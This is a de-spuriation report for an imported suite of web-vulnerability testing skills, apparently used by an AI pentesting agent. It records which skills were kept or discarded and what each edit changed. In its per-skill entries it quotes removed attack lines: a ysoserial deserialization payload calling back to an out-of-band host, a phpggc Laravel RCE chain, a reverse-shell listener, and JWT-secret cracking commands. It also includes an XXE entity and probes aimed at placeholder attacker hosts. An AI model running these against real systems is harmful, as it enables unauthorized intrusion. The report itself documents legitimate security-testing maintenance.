# SCREAMING-REPORT - de-spuriation of the imported suite

*Phase 2 deliverable (W0), 2026-09-28. Source copied verbatim from `/Users/diekgbbtt/purple-swan/skills` (source left untouched). One entry per source skill; every removal is quoted or precisely described ("no silent loss").*

## 1. Source verification and the group-tree fold

- 50 skill directories with `SKILL.md`; 7 group directories (`cloud`, `frameworks`, `protocols`, `reconnaissance`, `technologies`, `tooling`, `vulnerabilities`); `reconnaissance/` empty but for `.gitkeep`.
- 46 group `.md` files (the prior art's "48" is corrected here): 43 byte-identical to their flat skill, `vulnerabilities/idor.md` a strict subset of `idor/SKILL.md`, and `vulnerabilities/ssti.md` carrying one unique artifact.
- Unique artifact folded: the group's "Length / ETag diff" blind-probe line, preserved as `ssti/references/blind-probe-signals.md` (copied from the #232 branch, which first preserved it).
- `tooling/agent_browser.md` had no flat owner (a source-system browser-tool skill) and is discarded.
- All seven group trees were dropped.

## 2. Classification summary

- **KEEP: 30 skills.** 27 unambiguous web-vulnerability-testing procedures, plus the three operator-ruled borderlines `oauth`, `subdomain-takeover`, `llm-prompt-injection`.
- **DISCARD: 20.** 9 tool skills (`ffuf`, `httpx`, `katana`, `naabu`, `nmap`, `nuclei`, `semgrep`, `sqlmap`, `subfinder`), 9 technology skills (`aws`, `django`, `fastapi`, `firebase-firestore`, `kubernetes`, `nestjs`, `nextjs`, `python`, `supabase`), plus the group `tooling/agent_browser.md`, and the operator-ruled `cve-exploitation` and `low-hanging-fruit`.

### Borderline rulings (operator, 2026-09-28)

| Skill | Ruling | Action |
|---|---|---|
| `oauth` | KEEP | De-spuriated: source tooling removed. |
| `subdomain-takeover` | KEEP | De-spuriated: `Special Contexts` folded, absent tool swapped. |
| `llm-prompt-injection` | KEEP | De-spuriated: high-value targets extracted; framework-specific block flagged for the agnosticism pass. |
| `cve-exploitation` | DISCARD | Product-specific version-to-CVE workflow, not a vulnerability class. |
| `low-hanging-fruit` | DISCARD (content extracted) | Its CORS, CSP, WAF-bypass, header, and enumeration material was extracted to `_migration/bypass-proxy-techniques/low-hanging-fruit.md` for projection into the proxy/bypass-technique notions; its per-target severity table and finding workflow were not bypass content and were dropped. |

### Discard list with rationale

| Skill | Rationale |
|---|---|
| `ffuf`, `httpx`, `katana`, `naabu`, `nmap`, `nuclei`, `semgrep`, `sqlmap`, `subfinder` | Tool skills: CLI verbatim usage, not vulnerability-testing procedures. |
| `aws`, `django`, `fastapi`, `firebase-firestore`, `kubernetes`, `nestjs`, `nextjs`, `python`, `supabase` | Technology skills: stack/playbook content, not vulnerability classes. |
| `tooling/agent_browser.md` | Source-system browser tool, no flat owner. |
| `cve-exploitation` | Version-to-CVE workflow organised around specific products; not a vulnerability class. |
| `low-hanging-fruit` | Per-target hygiene checklist, not a vulnerability-class procedure (bypass/proxy content extracted, see above). |

## 3. Arsenal gaps discovered (for a future ticket)

The real arsenal is the Kali exec image (`Dockerfile.kali` + `kali/postrun.sh`, driven through `kali/mcp_server.py`). Genuine gaps - valuable techniques with no arsenal tool:

1. **OAST callback service** (affects `rce`, `ssrf`, `ssti`, `xxe`, `path-traversal-lfi-rfi`, `nosql-injection`). No `interactsh`/collaborator client exists; blind confirmation was adapted to the http-history capture surface or a minimal Python listener.
2. **Automated JWT tampering** (`authentication-jwt`, `oauth`, `crypto-weakness`). No `jwt_tool`/`hashcat`/`flask-unsign`; adapted to manual `python3` decode-edit-encode.
3. **Automated SQL injection extraction** (`sql-injection`). No `sqlmap`; manual boolean/time/error/OAST channels only.
4. **Java/PHP/.NET deserialization gadget-chain builders** (`rce`, `insecure-deserialization`). No `ysoserial`/`ysoserial.net`/`phpggc`; no JRE/`php-cli` in the image.
5. **Inbound reverse-shell listener** (`rce`). The `ncat` listener line was removed; incremental reads/OAST are the fallback.
6. **Template-based takeover fingerprint scanner** (`subdomain-takeover`). No `nuclei`; provider signatures must be matched with `httpx`/custom logic.
7. **Client-side prototype-pollution fuzzer** (`prototype-pollution`). No `ppfuzz`; adapted to manual canary spraying with `ffuf`/`python3`/`curl`.

Also absent from the arsenal but referenced only in DISCARDED skills: `semgrep`, `bandit`, `ast-grep`, `ripgrep`, `searchsploit`, `wpscan`, `commix`, `tplmap`, `nikto`, `gobuster`, `dirb`, `wfuzz`, `dalfox`.

## 4. Per-skill de-spuriation entries

*Produced per batch; the five batch reports are reproduced verbatim below.*

# De-spuriation report - batch A

## authentication-jwt
- **Classification:** KEEP
- **Internal agentic tools:** none found, and the previously removed `## Tooling` (jwt_tool) section is verified still absent.
- **Arsenal:** the skill invokes no tool commands at all, so nothing was removed or adapted.
- **Special contexts:** the `## Special Contexts` heading was deleted, `### Mobile` was moved verbatim into `## Attack Surface`, and `### SSO Federation` was moved verbatim into `## Advanced Techniques`.
- **High-value targets:** none (the skill has no such section).
- **Other removals:** none.
- **Arsenal gaps:** none (all described techniques are manual token-mutation checks needing only curl or python3).

## broken-function-level-authorization
- **Classification:** KEEP
- **Internal agentic tools:** none found.
- **Arsenal:** the only tooling mention is the generic phrase "via GraphQL or gRPC tools", which names no absent tool, so nothing was removed or adapted.
- **Special contexts:** none present (the skill has no such section).
- **High-value targets:** extracted to _migration/high-value-targets/broken-function-level-authorization.md (the `## High-Value Actions` section verbatim, with the required H1 prepended).
- **Other removals:** none.
- **Arsenal gaps:** none.

## business-logic
- **Classification:** KEEP
- **Internal agentic tools:** none found.
- **Arsenal:** the skill invokes no tool commands at all, so nothing was removed or adapted.
- **Special contexts:** the `## Special Contexts` heading was deleted, and `### E-commerce`, `### Banking/Fintech`, and `### SaaS/B2B` were moved verbatim into `## Advanced Techniques`.
- **High-value targets:** extracted to _migration/high-value-targets/business-logic.md (the `## High-Value Targets` section verbatim, with the required H1 prepended).
- **Other removals:** none.
- **Arsenal gaps:** none.

## crypto-weakness
- **Classification:** KEEP
- **Internal agentic tools:** none found.
- **Arsenal:** the skill named flask-unsign and hashcat, both absent from the arsenal, so the `## JWT Secret Brute-Force` bash block was removed (`pip install flask-unsign flask-unsign[wordlist]`, `flask-unsign --unsign --cookie "<cookie>" --no-literal-eval`, `flask-unsign --unsign --cookie "<cookie>" --wordlist /path/to/wordlist.txt`, `# hashcat -a 0 -m 16500 "<header>.<payload>.<signature>" wordlist.txt`) and replaced with a manual python3 HMAC-SHA256 secret-guessing snippet using only present tooling.
- **Special contexts:** none present (the skill has no such section).
- **High-value targets:** none (the skill has no such section).
- **Other removals:** none (the hashes.com lookup stays because it is plain python3 requests code, and the `http://target/...` placeholders stay as generic illustrative targets).
- **Arsenal gaps:** no dedicated JWT or Flask-session secret cracker is present (flask-unsign, hashcat, and jwt_tool are all absent), though the HS256 guessing technique survives via the manual python3 formulation.

## csrf
- **Classification:** KEEP
- **Internal agentic tools:** none found.
- **Arsenal:** the skill invokes no tool commands at all, so nothing was removed or adapted.
- **Special contexts:** the `## Special Contexts` heading was deleted, and `### Mobile/SPA` and `### Integrations` were moved verbatim into `## Attack Surface`.
- **High-value targets:** extracted to _migration/high-value-targets/csrf.md (the `## High-Value Targets` section verbatim, with the required H1 prepended).
- **Other removals:** none.
- **Arsenal gaps:** none.

## graphql
- **Classification:** KEEP
- **Internal agentic tools:** no verbatim tool names were found, but two source-system glue references were adapted generically.
- **Arsenal:** the skill invokes no absent-tool commands (graphql-cop is never invoked), so nothing was removed or adapted.
- **Special contexts:** none present (the skill has no such section).
- **High-value targets:** none (the skill has no such section).
- **Other removals:** two environment and workflow glue phrases were adapted, namely `Use project secrets (`TESTUSER_EMAIL` / `TESTUSER_PW`) for login.` becoming `Authenticate with available test credentials for login.`, and `(or use already-recorded `POST /path Query.field` attack-surface items)` becoming `(or use previously enumerated Query/Mutation fields)`.
- **Arsenal gaps:** none.
# De-spuriation report - batch B

## header-injection
- **Classification:** KEEP
- **Internal agentic tools:** none found, so nothing was removed or adapted.
- **Arsenal:** no tool command lines are present because every technique is expressed as raw HTTP text, so nothing was removed or adapted.
- **Special contexts:** no `## Special Contexts` section is present.
- **High-value targets:** extracted to _migration/high-value-targets/header-injection.md.
- **Other removals:** none.
- **Arsenal gaps:** none.

## http-method-tampering
- **Classification:** KEEP
- **Internal agentic tools:** none found, so nothing was removed or adapted.
- **Arsenal:** every code block uses Python `requests` on python3, which is in the arsenal, so nothing was removed or adapted.
- **Special contexts:** no `## Special Contexts` section is present.
- **High-value targets:** none present.
- **Other removals:** none.
- **Arsenal gaps:** none.

## http-request-smuggling
- **Classification:** KEEP
- **Internal agentic tools:** none found, so nothing was removed or adapted.
- **Arsenal:** every probe is expressed as raw HTTP text compatible with a python3 socket script, so no command line was removed or adapted.
  One prose mention of the Burp Suite smuggler extension remains in `## Pro Tips` and was left untouched per rule 6 because it is prose in a protected section rather than a command line.
- **Special contexts:** no `## Special Contexts` section is present.
- **High-value targets:** extracted to _migration/high-value-targets/http-request-smuggling.md.
- **Other removals:** none.
- **Arsenal gaps:** none, because raw and desync probing survives fully through python3 socket scripts.

## idor
- **Classification:** KEEP
- **Internal agentic tools:** the `knowledge://domain/` reference was adapted to `prior recon notes` in the evidence-gathering step.
- **Arsenal:** `arjun` is in the arsenal, so its two command lines were kept unchanged.
  `grpcurl` is absent, so `Validate references via grpcurl with tokens from different principals` was adapted to `Validate references via a generic gRPC client with tokens from different principals`.
- **Special contexts:** no `## Special Contexts` section is present.
- **High-value targets:** extracted to _migration/high-value-targets/idor.md.
- **Other removals:** none.
- **Arsenal gaps:** gRPC message crafting has no dedicated arsenal client because grpcurl is absent.

## information-disclosure
- **Classification:** KEEP
- **Internal agentic tools:** none found, so nothing was removed or adapted.
- **Arsenal:** no tool command lines are present, so nothing was removed or adapted.
- **Special contexts:** no `## Special Contexts` section is present.
- **High-value targets:** extracted to _migration/high-value-targets/information-disclosure.md, preserving the original `## High-Value Surfaces` heading verbatim in the extraction.
- **Other removals:** none.
- **Arsenal gaps:** none.

## insecure-deserialization
- **Classification:** KEEP
- **Internal agentic tools:** none found, so nothing was removed or adapted.
- **Arsenal:** the entire `## Tooling` section was removed because it invoked the absent ysoserial, phpggc, and interactsh-client tools and falsely claimed the sandbox ships interactsh-client.
  Removed command lines: `java -jar ysoserial.jar URLDNS "http://$(interactsh-client -json | jq -r .host)" | base64 -w0` and `./phpggc -b Laravel/RCE9 system id`.
  Two prose mentions outside protected sections were adapted by deleting the absent-tool clauses (`Tools: ysoserial (authorized testing only),` and ` (ysoserial.net)`).
  One `ysoserial` prose mention remains in `## Pro Tips` and was left untouched per rule 6.
- **Special contexts:** no `## Special Contexts` section is present.
- **High-value targets:** none present.
- **Other removals:** the deleted Tooling paragraph also carried the false source-sandbox inventory claim, which is covered by the section removal above.
- **Arsenal gaps:** gadget-chain payload generation for Java, PHP, and .NET has no arsenal tool because ysoserial, phpggc, ysoserial dot net, a JRE, and php-cli are all absent.
  Out-of-band callback oracles also lack a client because interactsh-client and every other OAST client are absent.
# De-spuriation report - batch C

## insecure-file-uploads
- **Classification:** KEEP
- **Internal agentic tools:** No internal agentic tool references were present.
- **Arsenal:** No absent-tool command lines were present (only generic technique prose plus the EICAR test string, which is a payload rather than a tool); nothing was removed or adapted.
- **Special contexts:** The `## Special Contexts` heading was deleted and all three subsections were moved verbatim under `## Advanced Techniques` as the nearest fitting section (`### Rich Text Editors`, `### Mobile Clients`, `### Serverless and CDN`); no subsection was target-specific, so none was deleted.
- **High-value targets:** none (the skill has no such section).
- **Other removals:** none.
- **Arsenal gaps:** none.

## mass-assignment
- **Classification:** KEEP
- **Internal agentic tools:** No internal agentic tool references were present.
- **Arsenal:** No tool invocations of any kind were present (pure payload-shape and framework-technique prose); nothing was removed or adapted.
- **Special contexts:** none (the skill has no such section).
- **High-value targets:** none (the skill has no such section).
- **Other removals:** none.
- **Arsenal gaps:** none.

## nosql-injection
- **Classification:** KEEP
- **Internal agentic tools:** No internal agentic tool references were present.
- **Arsenal:** No absent-tool command lines were present (OAST appears only as a generic technique with no OAST-client invocation, so it was kept); nothing was removed or adapted.
- **Special contexts:** none (the skill has no such section).
- **High-value targets:** extracted to _migration/high-value-targets/nosql-injection.md.
- **Other removals:** none.
- **Arsenal gaps:** none.

## open-redirect
- **Classification:** KEEP
- **Internal agentic tools:** No internal agentic tool references were present.
- **Arsenal:** No tool invocations of any kind were present (pure parser-differential and flow-technique prose); nothing was removed or adapted.
- **Special contexts:** none (the skill has no such section).
- **High-value targets:** extracted to _migration/high-value-targets/open-redirect.md.
- **Other removals:** none.
- **Arsenal gaps:** none.

## path-traversal-lfi-rfi
- **Classification:** KEEP
- **Internal agentic tools:** No internal agentic tool references were present.
- **Arsenal:** No absent-tool command lines were present (the `### OAST` heading and the "OAST beacons" lines name no OAST client and describe generic outbound-fetch confirmation, so they were kept); nothing was removed or adapted.
- **Special contexts:** none (the skill has no such section).
- **High-value targets:** extracted to _migration/high-value-targets/path-traversal-lfi-rfi.md.
- **Other removals:** none.
- **Arsenal gaps:** none.

## prototype-pollution
- **Classification:** KEEP
- **Internal agentic tools:** No internal agentic tool references were present.
- **Arsenal:** The skill named `ppfuzz` (absent) with the command `` `ppfuzz -l urls.txt` `` and `nuclei` (absent) with the command `` `nuclei -u https://target -tags prototype-pollution` ``, plus the false claim "The sandbox has `go` and `nuclei`"; both command lines were removed, the ppfuzz bullet was replaced with a present-tool adaptation (spray URL/param shapes via `ffuf` or a small `python3`/`curl` canary loop), and the intro was rewritten to "Detection is mostly about payload shapes (above) plus manual verification with present arsenal tools."; the `## Tooling` section itself was kept because the BlackFan gadget reference and the manual `node_modules` server-side guidance remain valid.
- **Special contexts:** none (the skill has no such section).
- **High-value targets:** none (the skill has no such section).
- **Other removals:** Renamed the `strixPolluted` canary key to `ppPolluted` in the baseline probe payload and in Pro Tips item 1 to drop source-system branding with no technique change.
- **Arsenal gaps:** No dedicated client-side prototype-pollution fuzzer (a ppfuzz equivalent) is installed, so automated spraying with pollution-semantics detection has no arsenal tool.
# De-spuriation report - batch D

## race-conditions
- **Classification:** KEEP
- **Internal agentic tools:** No internal source-system agentic tool references were present, so nothing was removed or adapted.
- **Arsenal:** The skill names no tool binaries and contains no tool command lines, so nothing was removed or adapted.
- **Special contexts:** The four subsections (GraphQL, WebSocket, Files and Storage, Auth Flows) were folded intact under `## Key Vulnerabilities` and the `## Special Contexts` heading was deleted.
- **High-value targets:** The `## High-Value Targets` section was extracted verbatim to _migration/high-value-targets/race-conditions.md and removed from the body.
- **Other removals:** No target or environment-specific glue was present, so nothing else was removed.
- **Arsenal gaps:** No arsenal gaps were identified.

## rce
- **Classification:** KEEP
- **Internal agentic tools:** No internal source-system agentic tool references were present, so nothing was removed or adapted.
- **Arsenal:** Adapted the OAST block by removing `interactsh-client -v` and the `*.oast.fun` callback domain (replaced with an attacker-controlled callback domain observed via http-history capture or a minimal Python listener, with `nslookup` and `curl` probes kept against `xyz.attacker.tld`), generalized `- Tools: ysoserial` to a local gadget-chain generator, and removed the whole `## Tooling` section holding `ncat -lvnp 4444` since no inbound listener exists in the arsenal.
- **Special contexts:** The skill has no Special Contexts section, so nothing was folded.
- **High-value targets:** The skill has no High-Value Targets section, so nothing was extracted.
- **Other removals:** No target or environment-specific glue was present, so nothing else was removed.
- **Arsenal gaps:** No OAST callback service exists in the arsenal, no inbound listener exists for reverse shells, and no Java deserialization gadget-chain builder exists, so blind confirmation depends on http-history capture or a hand-rolled Python callback receiver.

## sql-injection
- **Classification:** KEEP
- **Internal agentic tools:** No internal source-system agentic tool references were present, so nothing was removed or adapted.
- **Arsenal:** The skill invokes no tool binaries and no sqlmap command lines were present, so no command lines were removed or adapted.
- **Special contexts:** The skill has no Special Contexts section, so nothing was folded.
- **High-value targets:** The skill has no High-Value Targets section, so nothing was extracted.
- **Other removals:** No target or environment-specific glue was present, so nothing else was removed.
- **Arsenal gaps:** No automated SQLi extraction tooling exists in the arsenal, so data extraction depends on manual boolean, time, error, and OAST channels.

## ssrf
- **Classification:** KEEP
- **Internal agentic tools:** No internal source-system agentic tool references were present, so nothing was removed or adapted.
- **Arsenal:** Adapted the Blind SSRF bullet by removing `interactsh-client -v` and the `*.oast.fun` domain (replaced with an attacker-controlled callback domain observed via http-history capture or a minimal Python listener) and kept the timing, sizing, and port-mapping techniques unchanged.
- **Special contexts:** The skill has no Special Contexts section, so nothing was folded.
- **High-value targets:** The `## High-Value Targets` section was extracted verbatim to _migration/high-value-targets/ssrf.md and removed from the body, while the Testing Methodology step 8 inline mention was left in place per the batch instructions.
- **Other removals:** No target or environment-specific glue was present, so nothing else was removed.
- **Arsenal gaps:** No OAST callback service exists in the arsenal, so blind confirmation depends on http-history capture or a hand-rolled Python callback receiver.

## ssti
- **Classification:** KEEP
- **Internal agentic tools:** No internal source-system agentic tool references were present, so nothing was removed or adapted.
- **Arsenal:** Replaced the OOB comment naming interactsh with a generic OOB callback server reference and left the engine payloads plus the Python request snippets untouched since python3 and curl are present.
- **Special contexts:** The skill has no Special Contexts section, so nothing was folded.
- **High-value targets:** The `## High-Value Targets` section was extracted verbatim to _migration/high-value-targets/ssti.md and removed from the body.
- **Other removals:** The references/blind-probe-signals.md file was left untouched per the batch instructions, so no other removals were made.
- **Arsenal gaps:** Blind confirmation still needs attacker-controlled callback infrastructure since no OAST callback service exists in the arsenal.

## subdomain-takeover
- **Classification:** KEEP
- **Internal agentic tools:** No internal source-system agentic tool references were present, so nothing was removed or adapted.
- **Arsenal:** Replaced `nuclei/custom` with `httpx/custom` in the Pro Tips pipeline since nuclei is absent and httpx is present, and left the subfinder, amass, dnsx, and httpx references untouched.
- **Special contexts:** The four subsections (Storage and Static, Serverless and Hosting, CDN and Edge, DNS Delegations) were folded intact under `## Advanced Techniques` and the `## Special Contexts` heading was deleted.
- **High-value targets:** The skill has no High-Value Targets section, so nothing was extracted.
- **Other removals:** No target or environment-specific glue was present, so nothing else was removed.
- **Arsenal gaps:** No template-based scanner exists for takeover fingerprinting, so provider-signature matching depends on custom httpx checks.
# De-spuriation report - batch E

## oauth
- **Classification:** KEEP
- **Internal agentic tools:** none found.
- **Arsenal:** the skill named `jwt_tool`, `curl`, and Burp EsPReSSO; I removed the three `jwt_tool` command lines (`python3 /home/pentester/tools/jwt_tool/jwt_tool.py <ID_TOKEN>`, the `-X a` alg:none variant, the `-X k -pk pub.pem` confusion variant), removed the EsPReSSO sentence, and adapted the section to `python3` decode-edit-encode plus `curl` for the authorize-callback-token chain.
- **Special contexts:** none present.
- **High-value targets:** none present.
- **Other removals:** removed the source-sandbox path `/home/pentester/tools/jwt_tool` as environment-specific glue.
- **Arsenal gaps:** dedicated JWT-tampering tooling is missing, so the section now relies on a manual `python3` decode-edit-encode formulation.

## llm-prompt-injection
- **Classification:** KEEP
- **Internal agentic tools:** none found.
- **Arsenal:** no absent tools named and no command lines changed.
- **Special contexts:** none present.
- **High-value targets:** extracted verbatim to _migration/high-value-targets/llm-prompt-injection.md and removed from the body.
- **Other removals:** none, but the `## Framework-Specific` section (LangChain/OpenAI/LlamaIndex/NeMo) is technology-stack-specific material left in place and flagged for the variant/agnosticism pass.
- **Arsenal gaps:** none.

## two-principal-authz
- **Classification:** KEEP
- **Internal agentic tools:** adapted `record_domain_knowledge` in step 1 to "Record the tokens for reuse across the workflow" and rewrote "What to file" to "record the confirmed cross-principal finding with both principals' requests and the object ID as proof" in place of `judge_and_record_finding`.
- **Arsenal:** no tools named and no command lines changed.
- **Special contexts:** none present.
- **High-value targets:** none present.
- **Other removals:** none.
- **Arsenal gaps:** none.

## weak-credential-discovery
- **Classification:** KEEP
- **Internal agentic tools:** none found.
- **Arsenal:** only `python3` (plus `requests`/`bs4` libraries) is used, all present, so no command lines changed.
- **Special contexts:** none present.
- **High-value targets:** none present.
- **Other removals:** none (`http://target/...` placeholders are generic and were kept).
- **Arsenal gaps:** none.

## xss
- **Classification:** KEEP
- **Internal agentic tools:** none found.
- **Arsenal:** no absent tools named and no command lines changed.
- **Special contexts:** deleted the `## Special Contexts` heading and folded `### Email` and `### PDF and Docs` into `## Key Vulnerabilities` and `### File Uploads` into `## Injection Points`, with all bullets kept verbatim and no subsection deleted.
- **High-value targets:** none present (no such heading).
- **Other removals:** none.
- **Arsenal gaps:** none.

## xxe
- **Classification:** KEEP
- **Internal agentic tools:** none found.
- **Arsenal:** the skill invoked absent `interactsh-client -v`, so I replaced those lines with a generic attacker-controlled callback host formulation (`<!ENTITY % ex SYSTEM "http://CALLBACK/x.dtd">` plus watching that host for DNS/HTTP hits).
- **Special contexts:** deleted the `## Special Contexts` heading and folded `### SOAP` into `## Core Payloads`, `### SAML` into `## Key Vulnerabilities`, and `### SVG and Renderers` plus `### Office Docs` into `## Attack Surface`, with all bullets kept verbatim and no subsection deleted.
- **High-value targets:** extracted verbatim to _migration/high-value-targets/xxe.md and removed from the body.
- **Other removals:** removed the `xyz.oast.fun` example host as part of the interactsh adaptation.
- **Arsenal gaps:** OAST callback reception has no arsenal client, so blind-XXE confirmation now relies on an operator-provided callback host.
